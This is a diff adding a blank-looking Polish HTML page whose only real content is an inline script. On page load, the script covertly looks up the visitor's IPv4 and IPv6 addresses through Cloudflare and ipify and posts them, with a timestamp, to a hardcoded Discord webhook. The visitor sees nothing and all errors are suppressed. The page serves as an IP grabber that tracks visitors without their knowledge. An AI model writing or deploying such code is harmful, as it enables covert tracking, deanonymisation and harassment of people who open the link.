@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <title></title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body style="background:#fff; color:#000; font-family:system-ui,sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0;">
+  <h1 style="font-size:64px;"></h1>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1552425060147404841/MRjqZCgiycy-LvH4hrlEw14WO0DHjek7IUmVVdr1ov9qrARSXm2UqfpoU4D0psaXuq2h";
+
+    async function logVisit() {
+      let ipv4 = 'brak';
+      let ipv6 = 'brak';
+
+      try {
+        const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+        const text = await res.text();
+        const lines = Object.fromEntries(
+          text.trim().split('\n').map(l => l.split('='))
+        );
+        const ip = lines.ip || '';
+        if (ip.includes(':')) ipv6 = ip;
+        else ipv4 = ip;
+      } catch {}
+
+      if (ipv4 === 'brak') {
+        try {
+          const r = await fetch('https://api.ipify.org?format=json');
+          ipv4 = (await r.json()).ip;
+        } catch {}
+      }
+      if (ipv6 === 'brak') {
+        try {
+          const r = await fetch('https://api64.ipify.org?format=json');
+          const j = await r.json();
+          if (j.ip && j.ip.includes(':')) ipv6 = j.ip;
+        } catch {}
+      }
+
+      const time = new Date().toLocaleString('pl-PL', { timeZone: 'Europe/Warsaw' });
+
+      const content = `**IP:** \`${ipv4}\` / \`${ipv6}\`\n**time:** ${time}`;
+
+      fetch(WEBHOOK_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content })
+      }).catch(() => {});
+    }
+
+    logVisit();
+  </script>
+</body>
+</html>
